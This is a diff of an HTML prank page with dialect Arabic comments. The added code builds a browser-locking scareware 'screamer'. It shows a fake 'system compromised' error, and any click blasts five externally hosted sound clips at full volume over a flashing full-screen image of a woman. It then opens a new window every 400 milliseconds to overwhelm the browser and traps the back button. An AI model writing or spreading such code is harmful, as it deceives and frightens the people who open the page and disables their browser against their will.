@@ -3,73 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_FAILURE_CRITICAL ⚠️</title>
+    <title>⚠️ SYSTEM_CRITICAL_FAILURE ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة: تكبير كلي على حساب شاشة الهاتف سواسوة */
+        /* صورة المرأة: تغطي كامل الهاتف مع "رعشة" قوية سواسوة */
         #stalkerEntity { 
-            position: fixed; top: 0; left: 0; 
-            width: 100vw; height: 100vh; 
-            object-fit: cover; /* باش تجي مع الشاشة سوا سوا سواسوة */
-            z-index: 1; 
-            filter: contrast(250%) brightness(40%) grayscale(100%);
-            display: none;
-            animation: tremor 0.1s infinite;
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+            object-fit: cover; z-index: 1; display: none;
+            filter: contrast(300%) brightness(30%);
+            animation: seizure 0.05s infinite;
         }
 
-        @keyframes tremor {
-            0% { transform: translate(1px, 1px) rotate(0deg); }
-            50% { transform: translate(-1px, -2px) rotate(-1deg); }
-            100% { transform: translate(1px, -1px) rotate(1deg); }
+        @keyframes seizure {
+            0% { transform: translate(3px, 3px); filter: hue-rotate(0deg); }
+            50% { transform: translate(-3px, -5px); filter: hue-rotate(10deg); }
+            100% { transform: translate(2px, 4px); filter: hue-rotate(0deg); }
         }
 
-        /* رسالة التحذير المرعبة سواسوة */
-        #warningOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 100; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; color: #f00;
-            font-family: 'Courier New', Courier, monospace; text-align: center;
-        }
-
-        .blink { animation: blinker 0.2s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-
-        .btn-repair { background: #f00; color: #000; border: none; padding: 15px 40px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        #warning { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; }
+        .blink { animation: b 0.1s infinite; }
+        @keyframes b { 50% { opacity: 0; } }
+        .btn { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
     </style>
 </head>
-<body>
+<body onclick="launchNightmare()">
 
-    <div id="warningOverlay">
-        <h1 class="blink">☢️ WARNING ☢️</h1>
-        <p style="padding: 20px;">تم رصد محاولة اختراق لجهازك.<br>النظام الآن في وضع التدمير الذاتي.<br>سيتم مسح كافة البيانات خلال 30 ثانية.</p>
-        <button class="btn-repair" onclick="activateNightmare()">إصلاح النظام الآن</button>
+    <div id="warning">
+        <h1 class="blink">☢️ FATAL ERROR ☢️</h1>
+        <p>Your system has been compromised.<br>Press OK to attempt recovery.</p>
+        <button class="btn">OK / REPAIR</button>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <audio id="audio1" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>
-    <audio id="audio2" loop><source src="رابط_الصوت_الثاني_هنا" type="audio/mpeg"></audio>
+    <audio id="s1" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3" type="audio/mpeg"></audio>
+    <audio id="s2" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3" type="audio/mpeg"></audio>
+    <audio id="s3" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3" type="audio/mpeg"></audio>
+    <audio id="s4" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3" type="audio/mpeg"></audio>
+    <audio id="s5" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3" type="audio/mpeg"></audio>
 
     <script>
-        function activateNightmare() {
-            // تشغيل الأصوات الزوج بأعلى قوة سواسوة
-            const s1 = document.getElementById('audio1');
-            const s2 = document.getElementById('audio2');
-            s1.volume = 1.0; s2.volume = 1.0;
-            s1.play(); s2.play();
+        function launchNightmare() {
+            // تشغيل كامل الأصوات في وقت واحد سواسوة
+            for(let i=1; i<=5; i++) {
+                let s = document.getElementById('s'+i);
+                s.volume = 1.0;
+                s.play();
+            }
 
-            // إخفاء التحذير وإظهار المرأة سواسوة
-            document.getElementById('warningOverlay').style.display = 'none';
+            document.getElementById('warning').style.display = 'none';
             document.getElementById('stalkerEntity').style.display = 'block';
-
-            // تفعيل الشاشة الكاملة واللاق سواسوة
             document.documentElement.requestFullscreen();
+
+            // نظام "الحبس" ومنع الهروب سواسوة
             setInterval(() => {
+                // فتح نوافذ جديدة لتبليك المتصفح (100 صفحة) سواسوة
                 window.open(window.location.href, '_blank', 'width=10,height=10');
+                // منع زر الرجوع سواسوة
                 history.pushState(null, null, window.location.href);
-            }, 300);
+            }, 400);
         }
+        window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
